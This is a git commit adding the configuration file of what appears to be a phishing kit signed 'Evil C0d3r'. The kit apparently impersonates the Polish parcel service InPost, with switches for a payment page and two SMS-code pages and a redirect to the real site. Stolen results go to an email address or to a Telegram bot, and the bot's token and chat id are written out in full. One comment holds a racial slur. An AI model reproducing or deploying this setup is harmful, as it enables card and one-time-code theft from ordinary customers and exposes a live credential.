4705d51f824302244c065aecba4243b97d046414
navdav <navdav1203@gmail.com>
2026-08-12 21:00:20 +0100

    Add files via upload

---
+++ config.php
@@ -0,0 +1,41 @@
+<?php
+
+/*   
+		██████████          ███████       █████████    █████       █████ ████████         
+		░░███░░░░░█         ░░░░░███      ███░░░░░███ ███░░░███    ░░███ ███░░░░███        
+		░███  █ ░█████ ████████░███     ███     ░░░ ███   ░░███ ███████░░░    ░██████████ 
+		░██████ ░░███ ░░██░░███░███    ░███        ░███    ░██████░░███   ██████░░███░░███
+		░███░░█  ░███  ░███░███░███    ░███        ░███    ░██░███ ░███  ░░░░░░██░███ ░░░ 
+		░███ ░   ░░███ ███ ░███░███    ░░███     ██░░███   ███░███ ░███ ███   ░██░███     
+		██████████░░█████  █████████    ░░█████████ ░░░█████░ ░░███████░░█████████████    
+		░░░░░░░░░░  ░░░░░  ░░░░░░░░░      ░░░░░░░░░    ░░░░░░   ░░░░░░░░ ░░░░░░░░░░░░░    
+		
+		
+		ICQ & TELEGRAM : @evilcoder1337
+*/
+	# Evil C0d3r PAGE CONFIG FILE #
+	
+	$ExitLink = 'https://inpost.pl/'; // REDIRECT LINK HERE . . .
+
+	$save_result_txt = "no";
+	$show_payment_page ="yes";
+	$show_sms_page1 ="yes";
+	$show_sms_page2 ="yes";
+	$show_thanks_page ="yes";
+
+
+// ================================= //
+	/*  Send Result To Email	 */
+	
+	$mail = "";  //  EMAIL HERE .
+
+// ================================= //
+	/*  Send Result To TELEGRAM BOT */
+	
+    $bot_result = "yes"; // Result to your telegram bot true/false
+	$botkey = "7112576393:AAEE651qcm01mMhZ3oqVL6utGoxCq0KI8JA"; // TELEGRAM BOT KEY FROM @botfather
+    $teleid = "-4213384415"; // Your Numric Telegram UserID
+    $bot = "https://api.telegram.org/bot".$botkey."/sendMessage?chat_id=".$teleid."&parse_mode=Markdown&";  // Do Not Edit This Shit Nigga xD"
+	
+	$key = "1T1hE9XTKxb4yVBcwAgpN79sbAGvckiF"; // Your Key api protection DON't CHANGE IT BRO ...
+?>
